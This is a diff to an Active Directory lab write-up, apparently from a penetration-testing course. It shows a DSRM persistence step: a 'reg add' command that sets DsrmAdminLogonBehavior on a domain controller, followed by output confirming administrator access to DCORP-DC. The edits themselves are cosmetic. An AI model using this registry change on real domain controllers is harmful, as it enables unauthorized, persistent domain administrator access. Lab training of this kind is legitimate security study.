@@ -187,7 +187,7 @@ User : WDAGUtilityAccount
 [SNIP]
 ```
 
-**The DSRM administrator is not allowed to logon to the DC from network**. So, we need to change the logon behavior for the account by modifying registry on the DC. We can do this as follows.
+**The DSRM administrator is not allowed to logon to the DC from network**. So, we need to change the logon behavior for the account by modifying registry on the DC.
 
 `reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`:
 ```
@@ -272,22 +272,22 @@ Now, run the commands below to access the DC.
 
 `$env:username`:
 ```
-Administrator
+Administrator👤
 ```
 
 `$env:computername`:
 ```
-DCORP-DC
+DCORP-DC🖥️
 ```
 
 `whoami`:
 ```
-dcorp-dc\administrator
+dcorp-dc\administrator👤
 ```
 
 `hostname`:
 ```
-dcorp-dc
+dcorp-dc🖥️
 ```
 🚩
 
